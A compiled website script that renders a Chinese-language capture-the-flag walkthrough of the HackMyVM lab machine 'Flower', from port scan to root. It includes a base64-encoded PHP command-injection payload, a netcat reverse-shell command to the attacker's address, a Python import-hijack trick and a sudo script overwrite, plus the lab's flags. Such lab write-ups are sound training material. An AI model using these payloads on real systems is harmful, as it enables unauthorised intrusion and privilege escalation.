"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6575],{88265:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>t,default:()=>h,frontMatter:()=>l,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"HackMyVM/Machines/Flower/index","title":"Flower","description":"[Linux VM] [Tested on VirtualBox] created by || alienum","source":"@site/docs/HackMyVM/Machines/Flower/index.md","sourceDirName":"HackMyVM/Machines/Flower","slug":"/HackMyVM/Machines/Flower/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Flower/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Flower/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Emma","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Emma/"},"next":{"title":"Gift","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Gift/"}}');var a=s(74848),i=s(28453);const l={},t="Flower",o={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u8fdb\u4e00\u6b65\u63d0\u6743\u63a2\u6d4b",id:"\u8fdb\u4e00\u6b65\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u8fdb\u4e00\u6b65\u5c1d\u8bd5\u63d0\u6743",id:"\u8fdb\u4e00\u6b65\u5c1d\u8bd5\u63d0\u6743",level:2},{value:"root pwned",id:"root-pwned",level:2}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"flower",children:"Flower"})}),"\n",(0,a.jsxs)(n.admonition,{type:"note",children:[(0,a.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || alienum"}),(0,a.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-12-01"}),(0,a.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 83814c761c7d8042d6e5be77efdd73c5"}),(0,a.jsx)(n.p,{children:"\u2620 Root // 179"}),(0,a.jsx)(n.p,{children:"\ud83d\udc80 User // 179"}),(0,a.jsx)(n.p,{children:"\ud83d\udcddNotes //\nNo need overthinking, it's straightforward."})]}),"\n",(0,a.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(91753).A+"",width:"1020",height:"687"})}),"\n",(0,a.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.114\n"})}),"\n",(0,a.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.114\nHost is up (0.00047s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.38 (Debian)\nMAC Address: 08:00:27:02:B0:39 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u8bbf\u95ee /",src:s(19268).A+"",width:"1139",height:"763"})}),"\n",(0,a.jsx)(n.p,{children:"\u901a\u8fc7\u5bf9\u9875\u9762\u6e90\u7801\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u8bed\u53e5"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-html",children:'<option name="Lily" value="MSsy">Lily</option>\n<option name="Buttercup" value="Misz">Buttercup</option>\n<option name="Delphiniums" value="Mys1">Delphiniums</option>\n<option name="Cineraria" value="NSs4">Cineraria</option>\n<option name="Chicory" value="OCsxMw==">Chicory</option>\n<option name="Chrysanthemum" value="MTMrMjE=">Chrysanthemum</option>\n<option name="Michaelmas daisies" value="MjErMzQ=">Michaelmas daisies</option>\n'})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"value"})," \u53c2\u6570\u70b9\u6bd4\u8f83\u6709\u8da3\uff0c\u53d1\u73b0\u5176\u4e3a base64 \u7f16\u7801\u540e\u7684\u8ba1\u7b97\u8868\u8fbe\u5f0f\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u5b58\u5728\u547d\u4ee4\u6267\u884c\u7684\u53ef\u80fd"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 php \u5e38\u89c1\u7684 ",(0,a.jsx)(n.code,{children:"system"})," \u51fd\u6570\u8fdb\u884c\u547d\u4ee4\u6267\u884c"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"system('ls') --base64--\x3e c3lzdGVtKCdscycp\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"POST \u6267\u884c ls",src:s(69689).A+"",width:"1636",height:"976"})}),"\n",(0,a.jsx)(n.p,{children:"\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u5c1d\u8bd5\u53cd\u5f39 shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"system('nc -e /bin/sh 192.168.56.102 9999') --base64--\x3e c3lzdGVtKCduYyAtZSAvYmluL3NoIDE5Mi4xNjguNTYuMTAyIDk5OTknKQ==\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"web \u670d\u52a1 \u6267\u884c\u53cd\u5f39 shell",src:s(55774).A+"",width:"1636",height:"976"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u5f97\u5230\u53cd\u5f39\u7684 shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[12:15:56] Welcome to pwncat \ud83d\udc08!                                                                                                                         __main__.py:164\n[12:17:08] received connection from 192.168.56.114:43236                                                                                                      bind.py:84\n[12:17:09] 0.0.0.0:9999: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                    manager.py:957\n           192.168.56.114:43236: registered new host w/ db                                                                                                manager.py:957\n(local) pwncat$ back\n\n(remote) www-data@flower:/var/www/html$  whoami\nwww-data\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for www-data on flower:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on flower:\n    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/newgrp\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,a.jsxs)(n.p,{children:["\u53ef\u4ee5\u53d1\u73b0\uff0c",(0,a.jsx)(n.code,{children:"rose"})," \u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c\u4e00\u4e2a python \u811a\u672c\uff0c\u5e76\u4e14\u811a\u672c\u6240\u5728\u76ee\u5f55\u662f\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u4e8e\u662f\u5c1d\u8bd5\u5199\u5165\u53cd\u5f39 shell"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"import os;os.system('/bin/bash')\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7136\u540e\u5c06 payload \u5199\u5165 ",(0,a.jsx)(n.code,{children:"pickle.py"})," \u6587\u4ef6\uff0c\u4f7f\u5f97 ",(0,a.jsx)(n.code,{children:"import"})," \u7684\u65f6\u5019\u53ef\u4ee5\u88ab\u63a7\u5236"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo \"import os;os.system('/bin/bash')\" > pickle.py\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e\u5f00\u59cb\u5229\u7528"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@flower:/home/rose/diary$ ls -lh\ntotal 8.0K\n-rw-r--r-- 1 rose     rose     147 Nov 30  2020 diary.py\n-rw-r--r-- 1 www-data www-data  33 Dec 29 03:22 pickle.py\n(remote) www-data@flower:/home/rose/diary$ sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py\nrose@flower:~/diary$ whoami\nrose\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"rose@flower:~$ cat user.txt\nHMV{R0ses_are_R3d$}\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u8fdb\u4e00\u6b65\u63d0\u6743\u63a2\u6d4b",children:"\u8fdb\u4e00\u6b65\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for rose on flower:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser rose may run the following commands on flower:\n    (root) NOPASSWD: /bin/bash /home/rose/.plantbook\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u6587\u4ef6\u7684\u5185\u5bb9"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"#!/bin/bash\necho Hello, write the name of the flower that u found\nread flower\necho Nice, $flower submitted on : $(date)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u8fdb\u4e00\u6b65\u5c1d\u8bd5\u63d0\u6743",children:"\u8fdb\u4e00\u6b65\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,a.jsxs)(n.p,{children:["\u867d\u7136 ",(0,a.jsx)(n.code,{children:"/home/rose/.plantbook"})," \u6587\u4ef6\u4e0d\u5177\u6709\u5199\u5165\u6743\u9650\uff0c\u4f46\u662f\u5176\u6240\u6709\u6743\u662f ",(0,a.jsx)(n.code,{children:"rose"})," \u7528\u6237\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u6587\u4ef6\u6743\u9650\u540e\u76f4\u63a5\u7f16\u8f91"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"#!/bin/bash\n/bin/bash\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7528 poc \u8986\u76d6\u539f\u672c ",(0,a.jsx)(n.code,{children:"/home/rose/.plantbook"})," \u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u7136\u540e\u5229\u7528"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"rose@flower:~$ sudo /bin/bash /home/rose/.plantbook\nroot@flower:/home/rose# whoami\nroot\n"})}),"\n",(0,a.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@flower:~# cat root.txt \nHMV{R0ses_are_als0_black.}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},19268:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image_20231201-120131-3c76d4805a352ce785eeba6b60c476c6.png"},69689:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image_20231207-120734-ff70d23992ae0f9872b5ef916eb5afdb.png"},55774:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image_20231242-124235-e3a78bed8c69f548835cbf363c63b625.png"},91753:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image_20231244-114439-059b9dc9bb02d61edbfc53672e1e3c94.png"},28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>t});var r=s(96540);const a={},i=r.createContext(a);function l(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);